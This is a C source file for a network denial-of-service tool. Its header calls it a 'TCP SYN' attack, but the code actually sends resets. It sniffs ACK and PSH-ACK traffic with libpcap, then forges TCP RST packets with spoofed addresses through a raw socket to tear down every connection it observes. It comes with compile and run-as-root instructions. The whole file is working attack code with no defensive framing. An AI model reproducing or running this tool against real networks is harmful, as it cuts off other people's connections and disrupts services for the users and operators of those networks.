/* Simple TCP SYN Denial Service
 * gcc tcpsyndos.c -o tcpsyndos -lpcap
 * run as root
 */

#define __USE_BSD   // Using BSD IP header
#include <netinet/ip.h>
#define __FAVOR_BSD // Using BSD TCP header
#include <netinet/tcp.h>
#include <pcap.h>
#include <string.h>
#include <stdlib.h>

#define TCPSYN_LEN 20
#define MAXBYTES2CAPTURE 2048

/* Pseudoheader (Used to compute TCP checksum. Check RFC 793) */
typedef struct pseudoheader {
    u_int32_t src;
    u_int32_t dst;
    u_char zero;
    u_char protocol;
    u_int16_t tcplen;
} tcp_phdr_t;

typedef unsigned short u_int16;
typedef unsigned long u_int32;

/* Function Prototypes */
int TCP_RST_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt);
unsigned short in_cksum(unsigned short *addr, int len);


/* main(): Main function. Opens network interface for capture. Tells the kernal
 * to deliver packets with the ACK or PSH-ACK flags set. Prints information
 * about captured packets. Calls TCP_RST_send() to kill the TCP connection
 * using TCP RST packets.
 */
int main(int argc, const char *argv[])
{
    int count = 0;
    bpf_u_int32 netaddr = 0, mask = 0;  // to store network address and netmask
    pcap_t *descr = NULL;   // network interface handler
    struct bpf_program filter;  // place to store the BPF filter program
    struct ip *iphdr = NULL;    // IPv4 Header
    struct tcphdr *tcphdr = NULL;   // TCP Header
    struct pcap_pkthdr pkthdr;  // packet information (timestamp,size...)
    const unsigned char *packet = NULL; // received raw data
    char errbuf[PCAP_ERRBUF_SIZE];  // error buffer
    memset(errbuf, 0, PCAP_ERRBUF_SIZE);

    if (argc != 2) {
        fprintf(stderr, "USAGE: tcpsyndos <interface>\n");
        exit(1);
    }

    // open network device for packet capture
    descr = pcap_open_live(argv[1], MAXBYTES2CAPTURE, 1, 512, errbuf);
    if (descr == NULL) {
        fprintf(stderr, "ERROR in pcap_open_live(): %s\n", errbuf);
        exit(1);
    }

    // look up info from the capture device
    if (-1 == pcap_lookupnet(argv[1], &netaddr, &mask, errbuf)) {
        fprintf(stderr, "ERROR in pcap_lookupnet(): %s\n", errbuf);
        exit(1);
    }

    // compiles the filter expression: Packets with ACK or PSH-ACK flags set
    if (-1 == pcap_compile(descr, &filter, "(tcp[13] == 0x10) or (tcp[13] == 0x18)", 1, mask)) {
        fprintf(stderr, "ERROR in pcap_compile(): %s\n", pcap_geterr(descr));
        exit(1);
    }

    // load the filter program into the packet capture device
    if (-1 == pcap_setfilter(descr, &filter)) {
        fprintf(stderr, "ERROR in pcap_setfilter(): %s\n", pcap_geterr(descr));
        exit(1);
    }

    while (1) {
        // get one packet
        packet = pcap_next(descr, &pkthdr);
        if (packet == NULL) continue;

        iphdr = (struct ip *)(packet+14);   // assuming is Ethernet
        tcphdr = (struct tcphdr *)(packet+14+20);   // assuming no IP options

        if (count == 0)
            printf("+----------------------------------------------+\n");

        printf("Received Packet No.%d:\n", ++count);
        printf("ACK: %u\n", ntohl(tcphdr->th_ack));
        printf("SEQ: %u\n", ntohl(tcphdr->th_seq));
        printf("DST IP: %s\n", inet_ntoa(iphdr->ip_dst.s_addr));
        printf("SRC IP: %s\n", inet_ntoa(iphdr->ip_src.s_addr));
        printf("SRC PORT: %d\n", ntohs(tcphdr->th_sport));
        printf("DST PORT: %d\n", ntohs(tcphdr->th_dport));

        TCP_RST_send(tcphdr->th_ack, iphdr->ip_dst.s_addr, iphdr->ip_src.s_addr, tcphdr->th_dport, tcphdr->th_sport);
        TCP_RST_send(htonl(ntohl(tcphdr->th_seq)+1), iphdr->ip_src.s_addr, iphdr->ip_dst.s_addr, tcphdr->th_sport, tcphdr->th_dport);

        printf("+----------------------------------------------+\n");
    }

    return 0;
}

/* TCP_RST_send(): Crafts a TCP packet with the RST flag set using the supplied
 * values and sends the packet througn a raw socket.
 */
int TCP_RST_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt)
{
    static int i = 0;
    int one = 1;    // we need this variable for the setsockopt call

    // raw socket file descriptor
    int rawsocket = 0;

    // buffer for the TCP/IP SYN Packets
    char packet[sizeof(struct tcphdr) + sizeof(struct ip) + 1];

    // it will point to start of the packet buffer
    struct ip *ipheader = (struct ip *)packet;

    // it will point to the end of the IP header in packet buffer
    struct tcphdr *tcpheader = (struct tcphdr *)(packet + sizeof(struct ip));

    // TCP Pseudoheader (used in checksum)
    tcp_phdr_t pseudohdr;

    // TCP Pseudoheader + TCP actual header used for computing the checksum
    char tcpcsumblock[sizeof(tcp_phdr_t) + TCPSYN_LEN];

    // Althougn we are creating our own IP packet with the destination address on it,
    // the sendto() system call requires the sockaddr_in structure.
    struct sockaddr_in dstaddr;

    memset(&pseudohdr, 0, sizeof(tcp_phdr_t));
    memset(&packet, 0, sizeof(packet));
    memset(&dstaddr, 0, sizeof(dstaddr));

    dstaddr.sin_family = AF_INET;
    dstaddr.sin_port = dst_prt;
    dstaddr.sin_addr.s_addr = dst_ip;

    // get a raw socket to send TCP packets
    if ((rawsocket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
        perror("TCP_RST_send():socket()");
        exit(1);
    }

    // We need to tell the kernel that we'll be adding out own IP header
    // otherwise the kernel will create its own.
    if (setsockopt(rawsocket, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("TCP_RST_send():setsocketopt()");
        exit(1);
    }

    // IP Header
    ipheader->ip_hl = 5;    // Header length in octects
    ipheader->ip_v = 4;     // IP protocol version (IPv4)
    ipheader->ip_tos = 0;   // Type of Service (usually zero)
    ipheader->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));
    ipheader->ip_off = 0;   // Fragment offset. We'll not user this
    ipheader->ip_ttl = 64;  // Time to live: 64 in Linux, 128 in Windows...
    ipheader->ip_p = 6;     // Transport layer proto. TCP = 6, UDP = 17...
    ipheader->ip_sum = 0;   // Checksum. It has to be zero for the moment
    ipheader->ip_id = htons(1337);
    ipheader->ip_src.s_addr = src_ip;
    ipheader->ip_dst.s_addr = dst_ip;

    // TCP Header
    tcpheader->th_seq = seq;    // Sequence Number
    tcpheader->th_ack = htonl(1);   // Acknowledgement Number
    tcpheader->th_x2 = 0;       // Variable in 4 byte blocks. (Deprecated)
    tcpheader->th_off = 5;      // Segment offset (Lenght of the header)
    tcpheader->th_flags = TH_RST;   // TCP Flags. We set the Reset Flag
    tcpheader->th_win = htons(4500) + rand()%1000;  // Window size
    tcpheader->th_urp = 0;      // Urgent pointer
    tcpheader->th_sport = src_prt;
    tcpheader->th_dport = dst_prt;
    tcpheader->th_sum = 0;      // Checksum. (Zero until computed)

    // Fill the pseudoheader so we can compute the TCP checksum
    pseudohdr.src = ipheader->ip_src.s_addr;
    pseudohdr.dst = ipheader->ip_dst.s_addr;
    pseudohdr.zero = 0;
    pseudohdr.protocol = ipheader->ip_p;
    pseudohdr.tcplen = htons(sizeof(struct tcphdr));

    // Copy header and pseudoheader to a buffer to compute the checksum
    memcpy(tcpcsumblock, &pseudohdr, sizeof(tcp_phdr_t));
    memcpy(tcpcsumblock + sizeof(tcp_phdr_t), tcpheader, sizeof(struct tcphdr));

    // Compute the TCP checksum as the standard says (RFC 793)
    tcpheader->th_sum = in_cksum((unsigned short *)(tcpcsumblock), sizeof(tcpcsumblock));

    // Compute the IP checksum as the standard says (RFC 791)
    ipheader->ip_sum = in_cksum((unsigned short *)ipheader, sizeof(struct ip));

    // Send it through the raw socket
    if (sendto(rawsocket, packet, ntohs(ipheader->ip_len), 0, (struct sockaddr *)&dstaddr, sizeof(dstaddr)) < 0) {
        return -1;
    }

    printf("Sent RST Packet:\n");
    printf("    SRC: %s:%d\n", inet_ntoa(ipheader->ip_src), ntohs(tcpheader->th_sport));
    printf("    DST: %s:%d\n", inet_ntoa(ipheader->ip_dst), ntohs(tcpheader->th_dport));
    printf("   Seq=%u\n", ntohl(tcpheader->th_seq));
    printf("   Ack=%d\n", ntohl(tcpheader->th_ack));
    printf("   TCPsum: %02x\n",  tcpheader->th_sum);
    printf("   IPsum: %02x\n", ipheader->ip_sum);

    close(rawsocket);

    return 0;
}

/* This piece of code has been used many times in a lot of differents tools.
 * this is a public domain implementation of the checksum algorithm
 */
unsigned short in_cksum(unsigned short *addr, int len)
{
    register int sum = 0;
    u_short answer = 0;
    register u_short *w = addr;
    register int nleft = len;
    
    // Our algorithm is simple, using a 32-bit accumulator (sum),
    // we add sequential 16-bit words to it, adn at the end, fold back
    // all the carry bits from the top 16 bits into the lower 16 bits.

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    // mop up an odd byte, if necessary
    if (nleft == 1) {
        *(u_char *)(&answer) = *(u_char *)w;
        sum += answer;
    }

    // add bcak carry outs from top 16 bits to low 16 bits
    sum = (sum >> 16) + (sum & 0xffff);  // add hign 16 to low 16
    sum += (sum >> 16); // add carry
    answer = ~sum;  // truncate to 16 bits
    
    return answer;
}
